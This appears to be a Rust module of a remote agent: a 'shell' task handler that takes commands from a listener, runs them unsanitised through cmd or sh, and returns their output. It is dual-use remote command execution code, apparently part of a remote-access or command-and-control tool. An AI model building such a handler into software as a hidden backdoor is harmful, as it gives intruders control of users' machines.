use crate::internal::listener::{TaskHandler};

pub static COMMAND: &str = "shell";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() == 0  {
            return Ok("Invalid number of arguments received. Usage: 'shell [command]'.".to_string());
        }

        let command_output = if cfg!(target_os = "windows") {
            std::process::Command::new("cmd")
                    .args(&["/C", args.join(" ").as_str()])
                    .output()?
        } else {
            std::process::Command::new("sh")
                    .arg("-c")
                    .arg(args.join(" ").as_str())
                    .output()?
        };

        let mut output = format!("\nOutput for '{}'.\n", args.clone().join(" "));
        output.push_str(format!("{:-<50}\n", "").as_str());

        match command_output.status.success() {
            true => output.push_str(String::from_utf8(command_output.stdout)?.as_str()),
            false => output.push_str(String::from_utf8(command_output.stderr)?.as_str())
        }

        return Ok(output);
    }
}